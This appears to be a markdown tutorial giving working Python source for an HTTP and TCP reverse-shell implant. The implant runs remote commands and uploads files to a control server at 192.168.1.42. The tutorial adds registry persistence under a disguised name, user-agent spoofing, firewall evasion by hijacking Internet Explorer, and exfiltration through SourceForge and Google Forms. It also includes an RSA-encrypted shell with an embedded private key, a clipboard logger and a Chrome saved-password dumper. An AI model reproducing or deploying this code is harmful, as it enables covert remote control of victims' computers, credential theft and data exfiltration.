# HTTP reverse shell

*httpserver.py* :

```python
import http.server
import os, cgi

HOST_NAME = "192.168.1.42"
PORT_NUMBER = 8080

class MyHandler(http.server.BaseHTTPRequestHandler):
    
    def do_GET(self):
        command = input("Shell> ")
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(command.encode()) # equivalent to send() function in tcp reverse shell

    def do_POST(self):
        if self.path == '/store':
            try:
                ctype, pdict = cgi.parse_header(self.headers.get('content-type'))
                if ctype == 'multipart/form-data':
                    fs = cgi.FieldStorage(fp=self.rfile, headers = self.headers, environ={'REQUEST_METHOD': 'POST'})
                else:
                    print('[!!] Unexpected POST request')
                fs_up = fs['file']
                with open('/root/place_holder.txt', 'wb') as o:
                    print("[+] Writing file...")
                    o.write(fs_up.file.read())
                    self.send_response(200)
                    self.end_headers()
            except Exception as e:
                print(e)
            return
        self.send_response(200)
        self.end_headers()
        length = int(self.headers['Content-length'])
        postVar = self.rfile.read(length) # equivalent to recv() function in tcp reverse shell

        print(postVar.decode())

if __name__ == "__main__":
    server_class = http.server.HTTPServer
    httpd = server_class((HOST_NAME, PORT_NUMBER), MyHandler)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("[ ] Server is terminated")
        httpd.server.close()

```

*httpclient.py* :
```python
import requests
import os
import subprocess
import time

while True:
    req = requests.get('http://192.168.1.42:8080')
    command = req.text
    if 'terminate' in command:
        break
    elif 'grab' in command:
        grab, path = command.split("*")
        if os.path.exists(path):
            url = "http://192.168.1.42:8080/store" # /store means that we are sending a file over http
            files = {'file': open(path, 'rb')} # here we need to pass a dictionnary with a key named "file" and the object is the file itself
            r = requests.post(url, files=files) # be aware that file contain header "multipart/form-data"
    else:
        CMD = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        post_response = requests.post(url='http://192.168.1.42:8080', data=CMD.stdout.read())
        post_response = requests.post(url='http://192.168.1.42:8080', data=CMD.stderr.read())
    time.sleep(3)
```

For now on a POST looks like this in wireshark :<br>
<img src=https://github.com/sirbrowser/astroworld/blob/master/images/wireshark.png><br>
We can see that the user-agent is not legit at all so we need to change it in clienthttp.py:<br>
We add a variable `headers = {'User-Agent': 'mozilla/5.0'}`<br>
And in each we add this variable in all requests.post : `r = requests.post(url, files=files, headers=headers)`<br>

Now we have this in wireshark :<br>
<img src=https://github.com/sirbrowser/astroworld/blob/master/images/wireshark2.png><br>

For making our reverse shell persistent we need to add to the client.py:<br>
```python
path = os.getcwd().strip('\n') # getcwd = get current working directory

Null, userprof = subprocess.check_output('set USERPROFILE', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode().split('=')

destination = userprof.strip('\n\r') + '\\AppData\\' + '\\roaming\\' + 'client.exe'

if not os.path.exists(destination):
    shutil.copyfile(path+'\client.exe', destination)
    key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, wreg.KEY_ALL_ACCESS)
    wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ, destination)
    key.Close()
```

#### DDNS Aware shell
The problem here is that our attacker ip can change and you have to change the client.py.<br>
For this we can use [noip](https://www.noip.com/) that will reserve a dns server and address dynamically the adress in our client.py:<br>
in the main we need to add :<br>
`ip = socket.gethostbyname("<your ddns.net server>")`<br>
and add that ip variable in the `s.connect(())` function<br>

#### Bypassing Host Firewall
The problem here is if the internal firewall of the target machine as rules that allows internet explorer and chrome for example to have acces to internet and python is blocked, then our script cannot be executable.<br>
The solution here is to hijack Internet Explorer to run our reverse shell over IE, or any other program that is allowed to connect to internet.<br>
With this we are not worried about proxy bypassing, cause IE is normally integrating the administrator proxy.<br>
We need :
`pip install pypiwin32`<br>
`pip install pywin32`<br>
We need to use the COM in windows which stands for [Component Object Model](https://en.wikipedia.org/wiki/Component_Object_Model)<br>
```python
from win32com.client import Dispatch
from time import sleep
import subprocess

ie = Dispatch("InternetExplorer.Application")
ie.Visible = 0 # 0 runs IE in background and 1 opens a IE window

# Parameters for POST
dURL = "http://192.168.1.42"
Flags = 0
TargetFrame = 0

while True:
    ie.Navigate("http://192.168.1.42") #Load a page on the specified url
    while ie.ReadyState != 4: #when a page is loaded ReadyState() return 4 so we check until it is 4
        sleep(1)

    command = ie.Document.body.innerHTML
    command = command.encode()
    print(command.decode())

    if 'terminate' in command.decode():
        ie.Quit()
        break
    else:
        CMD = subprocess.Popen(command.decode(), shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        Data = CMD.stdout.read()
#        print(Data)
        PostData = memoryview( Data ) #we need this because we are using COM
        ie.Navigate(dURL, Flags, TargetFrame, PostData)
#        print(check)
    sleep(3)
```
#### Bypassing General Firewall
To bypass General firewall of the company we can use trusted websites. For example we will use [sourceforge](https://sourceforge.net/) so the target will send files to sourceforge over SCP and we will get back the files with FTP and filezilla on our kali so there is not link between the target and us.<br>
We need to create an account on sourceforge<br>
- Then `apt-get install filezilla` --> on kali<br>
- `pip install paramiko`<br>
- `pip install scp`<br>

Then we connect to our sourceforge in filezilla :<br>
<img src=https://github.com/sirbrowser/astroworld/blob/master/images/sourceforge.png><br>

and our script looks like this :<br>
```python
import paramiko
import scp

ssh_client = paramiko.SSHClient()

ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

ssh_client.connect("web.sourceforge.net", username="<sourceforge_username>", password="<sourceforge_pwd>")
print("[..] Authenticatin on sourceforge...")

scp = scp.SCPClient(ssh_client.get_transport())

scp.put("C:/Users/benja/Desktop/sarah.txt")
print("[+] File uploaded")

scp.close()
```
We can also interact with google form to get back the command responses from the target machine.<br>
First we need to create a google form with a paragraph block for answers :<br>
<img src=https://github.com/sirbrowser/astroworld/blob/master/images/form.png><br>
Then we need to enter an answer, copy the url of the form response and check the source code of the viewform to check for name of our html form.<br>
```python
import requests

url = 'https://docs.google.com/forms/u/0/d/e/1FAIpQLSdt4_WGXifggf2PDsw4bFhKOjojGo3e_EuA-FYgPZpp6rZllA/formResponse'


form_data = {'entry.1215992128': 'Bonjour a tous je mappelle Hugo Charpentier'}

r = requests.post(url, data=form_data)

```

#### Coding our own XOR encryption
```python
import string
import random

key = ''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits + '^!$%&/()=?{[]}+~#-_.:,;<>|\\') for _ in rang(0, 1024))

print(key)

print("\n" + "Key length = " + str(len(key)))
message = 'ipconfig'

def str_xor(s1,s2):
    return "".join([chr(ord(c1) ^ ord(c2)) for (c1, c2) in zip(s1, s2)])
    
enc = str_xor(message, key)
print("Encrypted message is " + "\n" + enc + "\n")

dec = str_xor(enc, key)
print("Decrypted message is " + "\n" + dec + "\n")
```

#### Protect our tunnel with AES256
`pip install pycryptodome`<br>
```python
from Cryptodome.Cipher import AES
from Cryptodome.Util import Padding

key = b"<our_key>" * 32 --> 256bits
IV = b"<our_initialisation_vector>" * 16

cipher = AES.new(key, AES.MODE_CBC, IV)

message = "Hello"
paddedmessage = Padding.pad(message.encode(), 16)
encrypted = cipher.encrypt(paddedmessage)

print(encrypted)

decipher = AES.new(key, AES.MODE_CBC, IV)
paddeddecrypted = decipher.decrypt(encrypted)
unpaddedencrypted = Padding.unpad(paddeddecrypted, 16)

print(unpaddedencrypted)
```

#### Protect our tunnel wit RSA
```python
from Cryptodome.PublicKey import RSA

new_key = RSA.generate(4096)

public_key = new_key.publickey().exportKey("PEM")
private_key = new_key.export_key("PEM")

public_key_file = open("public.pem", "wb")
public_key_file.write(public_key)
public_key_file.close()

private_key_file = open("private.pem", "wb")
private_key_file.write(private_key)
private_key_file.close()

print(public_key.decode())
print(private_key.decode())
```
*RSA_enc.py*:
```python
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import PKCS1_OAEP

def decrypt(cipher):
    privatekey = open("private.pem", "rb")
    private_key = RSA.importKey(privatekey.read())
    decryptor = PKCS1_OAEP.new(private_key)
    print (decryptor.decrypt(cipher).decode())


def encrypt(message):
    publickey = open("public.pem", "rb")
    public_key = RSA.importKey(publickey.read())
    encryptor = PKCS1_OAEP.new(public_key)
    encrypted_data = encryptor.encrypt(message)
    print(encrypted_data)
    decrypt(encrypted_data)

message = 'H'*500

if len(message) > 470:
    for i in range(0, len(message), 470):
        chunk = message[0+i:470+i]
        encrypt(chunk.encode())
else:
    encrypt(message.encode())

```
*client.py*:
```python
import subprocess
import socket
from Cryptodome.Cipher import PKCS1_OAEP
from Cryptodome.PublicKey import RSA
def decrypt(cipher):
    privatekey = '''-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----'''
    private_key = RSA.importKey(privatekey)
    decryptor = PKCS1_OAEP.new(private_key)
    return decryptor.decrypt(cipher).decode()

def encrypt(message):
    publickey = '''-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEApceMHQ9c5Cdf+qgd4ASP
M7WNbKavEwat78bMHQVK6cRNm2XSWCLpTsYN2eUALV++dYi2Im0T92bqYojRm+p4
vVKOvrdmcmfnITEw/++pbvGZYRf2y0zsSJi1Mi+lfgQs56QXBMIU6IdeCL2C7cex
9LNJ98ipGeN6nBiaExI9he3PcivztD5vHowCwkbzAnpZgPamrN10/KukWKvJ3t05
bc0MskjkhVaaN55eidzAXUmYmxyoLeke1GssiU+TInZQXbSiUeeFsZpkMjYX4nCS
xT/TuuFaDy6tfpfM+ePNEgeLjn7WAJh2ApxaYhmqwbDTsXd0ldHc4iNeGmlaEGE9
DgXPSp7ljV9SZ7eO9LZuiERz003NrUqSKSHdYgEIH8wZrCiKSP471oNYn0ye+KdV
/v25dqTXApO3QO/LZrJQ8twQyASR1LB3tTVYGuNpRVLlNC4j4ivL22uDCbGOIBOa
KDmu/QR5imLdjj3alVg69Ci3It3jTlubtHDaXTVs+i1133fOKMnRPLmCHE1/6MMS
i1BzDF46Q2XJwjgDnH5rk70n7sVquQtpHZkpQsuSSrjiL9Bi3jYghReVfFHC7aNF
p42v7EMaLohpnFm6yKiEm5UacMs7rLdnUQtAKo3r5UiNAegY6h/ZDncGhah1e5wF
dBPIb9wJyTjPYTiTJ3rDQGECAwEAAQ==
-----END PUBLIC KEY-----'''
    public_key = RSA.importKey(publickey)
    encryptor = PKCS1_OAEP.new(public_key)
    encryptedData = encryptor.encrypt(message)
    return encryptedData

def connect():
    s = socket.socket()
    s.connect(('192.168.0.152', 8080))
    while True:
        command = s.recv(1024)
        
        command = decrypt(command)
        print (command)
        if 'terminte' in command:
            s.close()
            break
        else:
            CMD = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
            result = CMD.stdout.read()
            print (len(result))
            if len(result) > 470:
                for i in range(0, len(result), 470):
                    chunk = result[0+i:470+i]
                    s.send(encrypt(chunk))
            else:
                s.send(encrypt(result))
connect()
```

#### Intercept Copy/Paste
`pip install pyperclip`<br>
```python
import pyperclip
import time

list = []

while True:
    if pyperclip.paste() != 'None':
        value = pyperclip.paste()
        if value not in list:
            list.append(value)
        print(list)
        time.sleep(3)
```

#### Dump Google saved password
When we click on save password on chrom the credentials are saved in a directory in our machine.<br>
```python
from os import getenv
import sqlite3
import win32crypt #High level libraru to call windows API CryptUnprotectData
from shutil import copyfile

# LOCALAPPDATA is a windows env variable which points to C:\Users\<username>\AppData\Local

path = getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Login Data"

# if the target was logging into a site which has an entry into the DB, then sometimes reading the chrome DB will return an error
#OperationalError: database is locked
#The workaround for this is to make a copy of the Login Data DB and pull out the copied DB

path2 = getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Login2"
copyfile(path, path2)

conn = sqlite3.connect(path2) # connect to the coped DB
cursor = conn.cursor()

cursor.execute('SELECT action_url, username_value, password_value FROM logins')

# To retrieve data after executing a SELECT, we call fetchall() to get a list of the matching rows
for raw in cursor.fetchall():
    print(raw[0] + "\n" + raw[1]) # print the action_url and username_value

    password = win32crypt.CryptUnprotectData(raw[2])[1]
    print(password)
    print("\n")

conn.close()
```
